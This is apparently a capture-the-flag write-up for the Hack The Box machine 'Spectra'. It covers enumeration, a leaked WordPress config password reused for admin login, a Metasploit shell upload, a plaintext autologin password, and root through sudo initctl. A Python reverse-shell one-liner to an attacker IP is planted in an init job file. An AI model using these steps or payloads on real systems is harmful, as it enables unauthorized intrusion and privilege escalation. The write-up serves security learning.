# Spectra 

export IP=10.10.10.229

## Solution

Lets start with the traditional nmap
```
cmd:  sudo nmap -sC -sV -vv -oN nmap/init $IP

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|   4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF1xom8Ljz30NltgYXTRoVI2ymBlBZn849bnFYNKwDgwvW9naxom8pe9mzV+I8pAb5AHeVdok7szaIke7nXINK5GdHw+P529fkRNfmq4V63RUmYNKeAZmfGubCQDwGHP0Gj8S/C1lCMp/9kdNPxDv8aamWTeVCTuqDOwMy0GmEGRyk9gaZjwA2T3kIVD/TjLVu5hkpwdoQHr0JYhJRqLKHqZqdcZY7vqUFuECqcgVZ0Sj52/VnT5lis+N3hZK1MqJW2vlPhdlXhESF2O2Z0gzVtnAMB8yT68pbcRUbl6OI0NC6ucKzSIb6g90vwF1kVlj22GXTcfu0r3tyCFlusJFnuhgAIrTax8eQu5W+vLAAM0pbMizVNOEzd4VtBpLBHunEkzDknUZn3k9X3XP9NsIReMW+T8XiLTSxZuve8EWdaIfXoAeUlj0Tsy2iwYfLk6XaO5xssZgHFvB4QnUvpdt2ybsfTEd1aySikuetak9pl7yECFD8jgqT6ybzG1qsTMsdsJz6o871al1r0Dyd76R0Dr3+dO7AhLJtPszZHJXK3YqCqF/qU6kNIPMTIXdiVEuYQ1JieYzyjN3CivzVUPFnvOu2+dD5kFQSQNqR8kHGRqZXW0oUQsDUh1GQsb+iO8sFMDIAqr1SfAKQEpCPpSFl6H1wtNHW8pJJNwj1FkKNXw==
80/tcp   open  http    syn-ack ttl 63 nginx 1.17.4
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   syn-ack ttl 63 MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```

Lets leave an all port on the back <br>

Brute forcing the port 80 we can see some things
```
cmd:gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -o gobuster/raft.80.log -t 100

/main (Status: 301)
/. (Status: 301)
/testing (Status: 301)
```

Now i do website crawls before manual inspection, they help a ton ! <br>

```
cmd: skipfish -o crawl http://$IP
```

From the report we can see a domain 
```
spectra.htb
```

By analyzing the websever, we can see 2 links
```
Software Issue Tracker      <- Wordpress website
Test                        <- Directory with Wordpress files
```

If we check the **/testing** folder, we can see an interesting file ! 
```
File: wp-config.php.save

define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
``` 

As we saw we had the 3306 open, but using this will just print that our host is not allowed to access the mysql instance so we cant confirm the creds right now <br>

Accessing the wordpress itself we can see a post
```
Title: Hello world!
Creator: administrator
```

Lets launch an wpscan while we play with burp in the login form. Nothing worth noting <br>

Well, nothing more found that the administrator account and the password for the database, lets try it ! It worked <br>
```
administrator:devteam01
```

Now, as we are administrators we have two options, use metasploit (which uses a special crafted plugin to get a reverse shell) or injecting in the theme ! <br>

```
exploit/unix/webapp/wp_admin_shell_upload

cmd: whoami && id 

nginx
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
```

Now, after shell upgraded lets look for something ! I started by trying the mysql credentials but without any luck
```
mysql -u dev -p devteam01
mysql -u dev -p 
mysql -u administrator -p devteam01
mysql -u administrator -p password
```

Next i tried to locate the folder which contains the web application (**/main**) to check the **wp-config.php** file
```
cmd: find / -type d -name "main" 2>/dev/null

/usr/local/share/nginx/html/main        <- Here it is
/usr/local/include/php/main
/mnt/stateful_partition/dev_image/share/nginx/html/main
/mnt/stateful_partition/dev_image/include/php/main

cmd: cat wp-config.php

define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'dev' );
/** MySQL database password */
define( 'DB_PASSWORD', 'development01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

Creds: dev:development01
```

They worked! Unfortunately it only had the administrator entry in the users table which we already have the credentials <br>

Checking the users we see a couple of them
```
cmd: cat /etc/passwd | grep -v "/bin/false"     <- in this OS means no shell

root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
```

While enumerating, i came across an intersting file in the **/opt** folder
```
File: autologin.conf.orig

(...)
for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
```

It changes the password for the account executing it with the **passwd** program, but only if a file (named passwd) exists. This file content will be the new password
```
/mnt/stateful_partition/etc/autologin <- Does not exist
/etc/autologin                        <- Exist
```

Catting the file inside **/etc/autologin**
```
cmd: cat passwd

SummerHereWeCome!!
```

Trying to **/bin/su** into katie gives permission denied, but trying **ssh** works ! 
```
cmd: whoami && id

katie
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)

cmd:cat ~/user.txt
FLAG: e89d27fe195e9114ffa72ba8913a6130
```

By checking what this user can run with sudo we have the following
```
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

Chekin the **gtfobins** does not provide any result, so checking the [initctl](https://linux.die.net/man/8/initctl) documentation, more specifically in the **reload-configuration**, we have **Requests that the init(8) daemon reloads its configuration** which leads us towards the [init](https://linux.die.net/man/8/initctl) documentation. <br>

There we can see that it reloads the configurations (for the services) from the folder **/etc/init** which, when analyzing, contains some configurations that we can modify due to group permissions
```
-rw-rw----  1 root developers   478 Jun 29  2020 test.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test1.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test10.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test2.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test3.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test4.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test5.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test6.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test7.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test8.conf
-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf
```

Before we procceed to insert the payload, i recommend to check the status of the service and stop it if running (thats the only way i got the payload to work) <br>

In one of this we can insert our payload leaving it like so
```
(...)
script

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.16",1415));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

endscript
```

After that just listen on the desired port, and start the service !

```
cmd: sudo /sbin/initctl start test.conf

cmd (local): whoami && id

root
uid=0(root) gid=0(root) groups=0(root)

cmd: cat /root/root.txt
FLAG:d44519713b889d5e1f9e536d0c6df2fc
```
